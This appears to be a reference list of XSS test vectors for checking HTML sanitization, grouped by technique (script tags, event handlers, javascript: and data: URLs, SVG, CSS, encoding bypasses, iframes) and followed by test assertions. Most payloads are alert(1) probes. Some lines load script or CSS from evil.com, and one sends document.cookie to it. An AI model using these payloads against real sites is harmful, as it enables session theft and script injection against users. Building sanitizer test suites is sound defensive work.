# XSS Test Vectors

Common XSS vectors for testing HTML sanitization.

## Script Injection

```html
<script>alert(1)</script>
<script src="http://evil.com/xss.js"></script>
<script>document.location='http://evil.com/?c='+document.cookie</script>
```

## Event Handlers

```html
<img src="x" onerror="alert(1)">
<body onload="alert(1)">
<input onfocus="alert(1)" autofocus>
<marquee onstart="alert(1)">
<video><source onerror="alert(1)">
<svg onload="alert(1)">
```

## JavaScript URLs

```html
<a href="javascript:alert(1)">click</a>
<a href="javascript:alert(String.fromCharCode(88,83,83))">click</a>
<a href="  javascript:alert(1)">click</a>
<a href="JaVaScRiPt:alert(1)">click</a>
```

## Data URLs

```html
<a href="data:text/html,<script>alert(1)</script>">click</a>
<img src="data:image/svg+xml,<svg onload=alert(1)>">
<object data="data:text/html,<script>alert(1)</script>">
```

## SVG Vectors

```html
<svg><script>alert(1)</script></svg>
<svg onload="alert(1)">
<svg><animate onbegin="alert(1)">
<svg><set onbegin="alert(1)">
```

## Style-Based

```html
<style>@import 'http://evil.com/xss.css';</style>
<div style="background:url(javascript:alert(1))">
<div style="width:expression(alert(1))">
```

## Encoding Bypasses

```html
<a href="&#106;avascript:alert(1)">click</a>
<a href="&#x6A;avascript:alert(1)">click</a>
<img src="x" onerror="&#97;lert(1)">
<a href="\u006aavascript:alert(1)">click</a>
```

## Meta/Refresh

```html
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">
```

## Object/Embed

```html
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<embed src="data:text/html,<script>alert(1)</script>">
```

## iframe

```html
<iframe src="javascript:alert(1)">
<iframe srcdoc="<script>alert(1)</script>">
<iframe src="data:text/html,<script>alert(1)</script>">
```

## Test Assertions

For each vector, verify:
1. The dangerous content is removed
2. Safe content is preserved where appropriate
3. No script execution occurs
4. Output is valid HTML
